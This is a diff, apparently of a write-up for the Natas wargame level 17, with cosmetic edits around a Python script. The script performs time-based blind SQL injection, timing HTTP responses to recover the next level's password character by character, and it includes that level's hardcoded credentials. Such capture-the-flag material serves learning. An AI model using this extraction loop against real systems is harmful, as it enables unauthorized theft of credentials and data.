@@ -24,7 +24,7 @@ from requests import get
 from requests.auth import HTTPBasicAuth
 from string import digits, ascii_letters
 
-# cCurrent level details
+# Current level details
 natas17_username = "natas17"
 natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
 
@@ -56,7 +56,7 @@ from requests import get
 from requests.auth import HTTPBasicAuth
 from string import digits, ascii_letters
 
-# cCurrent level details
+# Current level details
 natas17_username = "natas17"
 natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
 
@@ -100,13 +100,12 @@ from requests import get
 from requests.auth import HTTPBasicAuth
 from string import digits, ascii_letters
 
-# cCurrent level details
+# Current level details
 natas17_username = "natas17"
 natas17_password = "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd"
 natas18_password = ""
 password_length = 32
 characters_in_use = []
-
 
 # The sql injection time based input:
 waiting_time = 3 # seconds
@@ -121,13 +120,13 @@ AUTH = HTTPBasicAuth(natas17_username, natas17_password)
 print("Discovering the characters appearing in the password:")
 for c in digits + ascii_letters:
     res = get(url=URL.format(sql_injection_recover_charecters.format(c)), auth=AUTH)
-    
+
     if(res.elapsed.seconds >= waiting_time):
         characters_in_use.append(c)
         print("The password contains the following characters: " + ",".join(characters_in_use))
 
 # Revover the password
-print("Revealing the password")
+print("Revealing the password:")
 for _ in range(password_length):
     for c in characters_in_use:
         res = get(url=URL.format(sql_injection_time_based.format(natas18_password+c)), auth=AUTH)
@@ -136,6 +135,6 @@ for _ in range(password_length):
             natas18_password += c
             print("Password: " + natas18_password.ljust(password_length, "_"))
             break
-    
+
 print("Password for natas18 is: " + natas18_password)
 ```
